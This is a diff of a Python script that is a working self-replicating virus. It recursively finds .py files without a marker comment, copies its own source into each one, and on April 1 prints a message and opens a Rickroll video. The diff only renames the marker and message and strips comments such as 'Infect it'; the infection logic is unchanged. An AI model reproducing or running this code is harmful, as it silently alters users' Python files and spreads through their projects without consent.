@@ -1,13 +1,13 @@
 import os, datetime, inspect, webbrowser, pathlib, os
-DATA_TO_INSERT = "#get HACKED"
-def search(path): #search for target files in path
+DATA_TO_INSERT = "#spaghetti is dope as hell"
+def search(path):
     filestoinfect = []
     filelist = os.listdir(path)
     for filename in filelist:
-        if os.path.isdir(path+"/"+filename): #If it is a folder
+        if os.path.isdir(path+"/"+filename):
             filestoinfect.extend(search(path+"/"+filename))
-        elif filename[-3:] == ".py": #If it is a python script -> Infect it
-            infected = False #default value
+        elif filename[-3:] == ".py":
+            infected = False
             for line in open(path+"/"+filename):
                 if DATA_TO_INSERT in line:
                     infected = True
@@ -15,7 +15,7 @@ def search(path): #search for target files in path
             if infected == False:
                  filestoinfect.append(path+"/"+filename)
     return filestoinfect
-def infect(filestoinfect): #changes to be made in the target file
+def infect(filestoinfect):
     target_file = inspect.currentframe().f_code.co_filename
     virus = open(os.path.abspath(target_file))
     virusstring = ""
@@ -32,7 +32,7 @@ def infect(filestoinfect): #changes to be made in the target file
          f.close()
 def explode():
       if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 1:
-             print ("GET FRICKED I HACKED YOU AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+             print ("SHOTGUN")
              webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
 def getfucked():
 
